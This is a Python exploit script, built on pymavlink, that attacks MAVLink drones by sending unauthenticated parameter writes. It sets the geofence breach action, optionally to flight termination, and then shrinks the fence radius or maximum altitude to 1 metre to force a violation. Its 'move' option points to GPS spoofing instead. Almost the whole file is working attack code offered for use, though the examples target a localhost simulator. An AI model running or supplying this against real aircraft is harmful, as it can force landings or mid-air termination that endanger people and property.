#!/usr/bin/env python3
"""
Geofence Attack Exploit Script
Modifies geofence to trigger false violations and emergency responses
"""

import sys
import time
from pymavlink import mavutil

def trigger_geofence_violation(connection, method='shrink'):
    """
    Trigger geofence violation by modifying boundaries
    
    Args:
        connection: MAVLink connection object
        method: Attack method ('shrink', 'lower', 'move')
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Triggering geofence violation (method: {method})...")
    
    if method == 'shrink':
        # Shrink geofence radius to very small
        print("[*] Method: Shrinking geofence radius to trigger violation")
        param_id = 'FENCE_RADIUS'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            1.0,  # 1 meter radius (very small)
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        time.sleep(0.5)
        print("[+] Geofence radius set to 1 meter")
    
    elif method == 'lower':
        # Lower maximum altitude
        print("[*] Method: Lowering maximum altitude to trigger violation")
        param_id = 'FENCE_ALT_MAX'.ljust(16, '\x00')[:16]
        connection.mav.param_set_send(
            target_system,
            target_component,
            param_id.encode('utf-8'),
            1.0,  # 1 meter max altitude
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        )
        time.sleep(0.5)
        print("[+] Maximum altitude set to 1 meter")
    
    elif method == 'move':
        # Move geofence center away from drone
        print("[*] Method: Moving geofence center (requires FENCE_CENTER parameter)")
        # Note: This may not work if FENCE_CENTER is not a settable parameter
        # Alternative: Use GPS spoofing to move drone outside geofence
        print("[!] Moving geofence center may not be supported")
        print("[*] Alternative: Use GPS spoofing to move drone outside geofence")
    
    return True

def set_geofence_action(connection, action='rtl'):
    """
    Set geofence breach action
    
    Args:
        connection: MAVLink connection object
        action: Action type ('none', 'rtl', 'land', 'terminate')
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    action_map = {
        'none': 0,
        'rtl': 1,  # Return to launch
        'land': 2,  # Land immediately
        'terminate': 3  # Flight termination
    }
    
    action_value = action_map.get(action, 1)
    
    print(f"[*] Setting geofence action to: {action}")
    
    param_id = 'FENCE_ACTION'.ljust(16, '\x00')[:16]
    connection.mav.param_set_send(
        target_system,
        target_component,
        param_id.encode('utf-8'),
        action_value,
        mavutil.mavlink.MAV_PARAM_TYPE_UINT8
    )
    time.sleep(0.5)
    print(f"[+] Geofence action set to {action}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 geofence_attack.py <connection> [method] [action]")
        print("Example: python3 geofence_attack.py udp:127.0.0.1:14550")
        print("Example: python3 geofence_attack.py udp:127.0.0.1:14550 shrink rtl")
        print("Example: python3 geofence_attack.py udp:127.0.0.1:14550 lower terminate")
        print("\nMethods:")
        print("  shrink  - Shrink geofence radius to trigger violation")
        print("  lower   - Lower maximum altitude to trigger violation")
        print("  move    - Move geofence center (may not be supported)")
        print("\nActions (on breach):")
        print("  none      - No action")
        print("  rtl       - Return to launch (default)")
        print("  land      - Land immediately")
        print("  terminate - Flight termination")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else 'shrink'
    action = sys.argv[3] if len(sys.argv) > 3 else 'rtl'
    
    if method not in ['shrink', 'lower', 'move']:
        print(f"[-] Unknown method: {method}")
        sys.exit(1)
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Set geofence action
    set_geofence_action(connection, action)
    
    # Trigger violation
    success = trigger_geofence_violation(connection, method)
    
    if success:
        print("\n[+] Geofence attack executed")
        print("[!] Drone should trigger geofence violation and execute action")
    else:
        print("\n[-] Geofence attack failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
